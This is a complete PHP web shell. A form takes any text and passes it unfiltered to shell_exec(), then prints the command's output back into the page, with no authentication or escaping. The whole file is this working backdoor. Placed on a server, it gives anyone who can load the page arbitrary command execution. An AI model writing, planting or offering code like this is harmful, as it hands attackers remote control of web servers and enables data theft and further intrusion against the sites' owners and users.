<?php

if(empty($_POST['Submit']))
{
?>
<form action="" method="POST" enctype="multipart/form-data" target="output">
	<table width="100%" border=0 cellpadding="4" cellspacing="2" class="body">
		<tr>
			<td valign="top" align="left">
				<input type=text name="script" value="" size=80 style="border: 1px solid #ccc;">
			</td>
		</tr>
		<tr bgcolor=#f0f0f0>
			<td>
				<input type=submit name="Submit" value="Execute">
				</td>
			</tr>
		<tr>
			<td valign="top" align="left">
				<iframe src="" name="output" width="100%" height="400px" frameborder=0></iframe>
			</td>
		</tr>
	</table>
</form>
<?php
} else {
	$script = get_magic_quotes_gpc() ? stripslashes($_POST['script']) : stripslashes($_POST['script']);
	$out	= '$'.$script."\n".shell_exec($script);
	echo '<textarea name="script" style="width: 100%; height: 98%;border: 1px solid #ccc;">'.$out.'</textarea>';
}